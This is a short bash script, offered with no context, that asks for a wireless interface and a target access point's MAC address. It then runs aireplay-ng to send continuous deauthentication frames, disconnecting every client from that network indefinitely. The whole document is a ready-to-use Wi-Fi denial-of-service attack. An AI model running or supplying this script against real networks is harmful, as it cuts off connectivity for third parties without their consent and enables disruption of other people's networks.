#!/bin/bash  
echo -n "Interface: ";read interface; 
echo -n "MAC: ";read ap; 
sudo aireplay-ng --ignore-negative-one --deauth 0 -a $ap $interface
